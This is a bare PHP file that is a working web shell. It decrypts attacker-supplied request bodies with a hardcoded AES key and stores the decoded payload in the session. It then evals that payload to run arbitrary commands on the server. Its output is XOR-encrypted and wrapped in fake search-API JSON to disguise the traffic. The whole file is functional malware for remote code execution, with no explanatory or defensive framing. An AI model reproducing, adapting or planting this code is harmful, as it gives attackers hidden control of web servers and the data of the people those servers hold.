<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);

echo test13141213;

function aes128($data,$mode){$result="";$blocksize=16;$key=base64_decode("0J5YM0fKgYVrmMkwTUIF+Q==");if($mode==1){$pad=$blocksize -(strlen($data)% $blocksize);$data .=str_repeat(chr($pad), $pad);}if(function_exists("openssl_encrypt")){if($mode==1){$result=openssl_encrypt($data,"AES-128-ECB",$key,OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING);}else{$result=openssl_decrypt($data,"AES-128-ECB",$key,OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING);}}else if(function_exists("mcrypt_encrypt")){if($mode==1){$result=mcrypt_encrypt("rijndael-128", $key, $data, "ecb", "");}else{$result=mcrypt_decrypt("rijndael-128", $key, $data, "ecb", "");}}if($mode==2){$pad=ord($result{strlen($result)-1});if($pad > strlen($result))return false;if(strspn($result, chr($pad), strlen($result)- $pad)!=$pad)return false;$result=substr($result, 0, -1 * $pad);}return $result;}function xorEncrypt(&$data){$key=base64_decode("R84sh+6uJ9oXJpMfw2pc/Q==");$len=strlen($data);$keyLen=strlen($key);$index=0;for($i=1;$i <=$len;$i++){$index=$i-1;$data[$index]=$data[$index]^$key[($i%$keyLen)];}}







$requestData = file_get_contents("php://input");$strSize = strlen($requestData);$requestData = substr($requestData,110,strlen($requestData)-112);
$requestData = pack("H*",$requestData);$requestData = aes128($requestData, 2);
$payloadName="NxVpWFK";
if (isset($_SESSION[$payloadName])){
    $payload=base64_decode($_SESSION[$payloadName]);
    eval($payload);
    $responseData = @run($requestData);
    xorEncrypt($responseData);$responseData = base64_encode($responseData);
    $responseData=base64_decode("eyJjb2RlIjowLCJkYXRhIjp7InN1Z2dlc3RJdGVtcyI6W10sImdsb2JhbCI6ImUxSlRRWDBwWg==").$responseData;$responseData.=base64_decode("IiwiZXhEYXRhIjp7ImFwaV9mbG93MDEiOiIwIiwiYXBpX2Zsb3cwMiI6IjAiLCJhcGlfZmxvdzAzIjoiMSIsImFwaV9mbG93MDQiOiIwIiwiYXBpX2Zsb3cwNSI6IjAiLCJhcGlfZmxvdzA2IjoiMCIsImFwaV9mbG93MDciOiIwIiwiYXBpX3RhZyI6IjIiLCJsb2NhbF9jaXR5aWQiOiItMSJ9fX0=");@http_response_code(200);header("Content-Type: application/json");echo $responseData;
}else{
    $_SESSION[$payloadName] = base64_encode($requestData);
}
